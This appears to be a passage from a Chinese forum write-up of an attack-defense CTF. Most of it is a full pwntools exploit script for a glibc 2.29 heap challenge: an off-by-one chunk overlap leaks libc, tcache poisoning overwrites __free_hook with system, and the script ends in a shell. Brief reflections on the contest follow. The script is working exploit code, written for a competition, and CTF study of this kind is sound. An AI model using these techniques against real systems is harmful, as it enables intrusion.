
```
#4cbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0j5i4c8J5K9i4R3I4x3o6l9I4i4K6u0r3N6$3g2D9M7s2N6F1

#-*- coding:utf-8 -*-

from PwnContext import *



try:

    from IPython import embed as ipy

except ImportError:

    print ('IPython not installed.')



if __name__ == '__main__':        

    context.terminal = ['tmux', 'splitw', '-h']

    #context.log_level = 'debug'

    # functions for quick script

    s       = lambda data               :ctx.send(str(data))        #in case that data is an int

    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 

    sl      = lambda data               :ctx.sendline(str(data)) 

    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 

    r       = lambda numb=4096          :ctx.recv(numb)

    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)

    irt     = lambda                    :ctx.interactive()

    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)

    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)

    # misc functions

    uu32    = lambda data   :u32(data.ljust(4, '\0'))

    uu64    = lambda data   :u64(data.ljust(8, '\0'))



    ctx.binary = './pwn2'

    ctx.custom_lib_dir = '/home/iddm/glibc-all-in-one/libs/2.29-0ubuntu2_amd64'

    ctx.remote = ('172.16.0.195', 8888)

    ctx.debug_remote_libc = True



    ctx.symbols = {

        'node':0x4060,

        'limit':0x4010

    }



    ctx.breakpoints = [0x1656]#menu:0x1656



    def lg(s,addr):

        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))



    def add(idx,size,content='\n'):

        sla('> ',1)

        sla('idx',idx)

        sla('size',size)

        sa('cnt',content)





    def delete(idx):

        sla('> ',2)

        sla('idx',idx)



    def show(idx):

        sla('> ',4)

        sla('idx',idx)



    def edit(idx,content='\n'):

        sla('> ',3)

        sla('idx',idx)

        sa('cnt',content)





    def hint(content='a'*8):

        sla('> ',5)

        sleep(0.1)

        s(content)





    rs('remote')



    #dbg()

    add(0,0x88,'a'*0x88)

    add(1,0x108,'a'*0x108)

    add(2,0x88,'a'*0x88)

    add(3,0x88,'a'*0x88)

    add(4,0x88,'a'*0x88)

    add(5,0x108,'a'*0x108)

    add(6,0x88,'a'*0x88)

    add(7,0x208,'a'*(0x100+0x60) + p64(0) + p64(0xa1) + '\n')

    #dbg()

    edit(0,'a'*0x88+'\x61\x04')

    delete(1)



    add(1,0x108,'a'*0x108)

    show(2)

    libc = ru('\x7f',drop=False)[-6:]

    libc_base = uu64(libc) - 0x1bfca0

    lg('libc',libc_base)

    free_hook = libc_base + ctx.libc.sym['__free_hook']



    #dbg()

    payload = 'a'*0x80 + p64(0) + p64(0x431)

    payload = payload.ljust(0x110,'a')

    payload += p64(0) + p64(0x101)

    add(8,0x150,payload+'\n')

    #delete(5)

    #edit(4,'a'*0x88+'\x41\x02')

    #delete(5)

    #dbg()

    #delete(3)

    delete(4)



    payload1 = 'a'*0x40 + p64(0) + p64(0x241)

    payload = payload1.ljust(0x150,'a')

    payload += p64(0) + p64(0x241)

    payload += '\n'

    #payload2 = 'a'*0x100 + p64(0) + p64(0x241) + p64(free_hook)



    add(4,0x1e8,payload)

    delete(6)

    delete(5)

    delete(3)

    #dbg()

    #add(3,)

    #add(3,0x1f8,payload2+'\n')

    payload = p64(free_hook)

    payload = payload.ljust(0x110,'\0')

    payload += '\x80\x48\n' 

    add(3,len(payload),payload)





    delete(7)

    delete(8)

    #dbg()

    add(7,0x80,p64(free_hook-0x25000)+'\n')

    hint()

    system = libc_base + ctx.libc.sym['system']

    hint(p64(system-0x25000))

    add(8,0x80,'/bin/sh\n')

    delete(8)



    irt()

```

这个题目当初做出来的时候应该是一血，还没有队伍来抢这个分数，得了几轮分数之后有其他师傅做出来了，直接把我踢下来了，连上shell之后也会被断开。大哥真的太狠了。一个题目只能有一个队伍得分，技不如人只能甘拜下风了。还要好好研究一下以后再有这种机会要anti一下。

### 最后

比赛有的地方确实需要吐槽，但是吐槽也顶不了什么用，有的地方也有可取的地方，比如CTF的登顶模式真的很有趣（虽然被大哥直接无情踢下来），最后的AI解题提交对抗样本也不常见，感觉有意思；不过最后的机器人：人工智能挖掘漏洞+exp利用（应该是针对比较简单的pwn）到底是怎么做的呢？非常想知道。希望大佬们告诉我一下，我学习学习。

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2019-11-28 09:58 被Seclusion编辑，原因：

上传的附件：

- [`pwn.tar.gz`](javascript:void(0);)（844.39kb，21次下载）
